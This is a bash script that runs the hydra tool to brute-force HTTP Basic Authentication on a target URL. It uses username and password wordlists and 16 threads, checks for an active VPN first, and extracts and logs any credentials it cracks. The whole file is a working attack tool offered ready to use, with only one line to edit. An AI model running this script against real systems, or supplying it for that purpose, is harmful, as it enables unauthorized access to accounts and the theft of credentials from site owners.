#!/bin/bash

# HTTP Basic Authentication Brute Force Script
# Description: Attacks HTTP Basic Auth protected pages
# Usage: Edit TARGET variable and run

set -euo pipefail

# ============================================
# CONFIGURATION - EDIT ONLY THIS LINE
# ============================================
TARGET="http://example.com/admin"  # <-- Change this to your target URL with Basic Auth

# ============================================
# DO NOT EDIT BELOW THIS LINE
# ============================================

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Configuration
PROJECT_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
WORDLIST="${PROJECT_ROOT}/config/admin_passwords.txt"
USERNAMES="${PROJECT_ROOT}/config/admin_usernames.txt"
THREADS=16
LOG_FILE="${HOME}/hydra-logs/http_basic_auth_$(date +%Y%m%d_%H%M%S).log"

# Banner
echo -e "${BLUE}"
echo "╔════════════════════════════════════════╗"
echo "║   HTTP Basic Auth Attack Script       ║"
echo "║   Target: $TARGET"
echo "╚════════════════════════════════════════╝"
echo -e "${NC}"

# Check VPN
if [ -f "${PROJECT_ROOT}/scripts/vpn_check.sh" ]; then
    bash "${PROJECT_ROOT}/scripts/vpn_check.sh" || {
        echo -e "${YELLOW}[!] VPN not active. Use --skip-vpn to continue anyway${NC}"
        exit 1
    }
fi

# Check if hydra is installed
if ! command -v hydra &> /dev/null; then
    echo -e "${RED}[!] Hydra not found. Run: bash install.sh${NC}"
    exit 1
fi

# Check wordlists
if [ ! -f "$WORDLIST" ]; then
    echo -e "${RED}[!] Password wordlist not found: $WORDLIST${NC}"
    exit 1
fi

if [ ! -f "$USERNAMES" ]; then
    echo -e "${RED}[!] Username wordlist not found: $USERNAMES${NC}"
    exit 1
fi

# Create log directory
mkdir -p "$(dirname "$LOG_FILE")"

echo -e "${BLUE}[*] Starting HTTP Basic Auth attack...${NC}"
echo -e "${BLUE}[*] Target: $TARGET${NC}"
echo -e "${BLUE}[*] Threads: $THREADS${NC}"
echo -e "${BLUE}[*] Log: $LOG_FILE${NC}"

# Run hydra attack
hydra -L "$USERNAMES" -P "$WORDLIST" \
    -t "$THREADS" \
    -f \
    -o "$LOG_FILE" \
    "$TARGET" \
    http-get 2>&1 | while IFS= read -r line; do
    
    echo "$line"
    
    if echo "$line" | grep -q "login:"; then
        username=$(echo "$line" | sed -n 's/.*login: \([^ ]*\).*/\1/p')
        password=$(echo "$line" | sed -n 's/.*password: \(.*\)/\1/p')
        
        echo -e "${GREEN}[+] SUCCESS! Credentials found:${NC}"
        echo -e "${GREEN}    Username: $username${NC}"
        echo -e "${GREEN}    Password: $password${NC}"
        
        # Save to results
        if [ -f "${PROJECT_ROOT}/scripts/logger.sh" ]; then
            source "${PROJECT_ROOT}/scripts/logger.sh"
            save_result "http-basic" "$TARGET" "80" "$username" "$password"
        fi
    fi
done

echo -e "${GREEN}[+] Attack completed!${NC}"
echo -e "${BLUE}[*] Results saved to: $LOG_FILE${NC}"
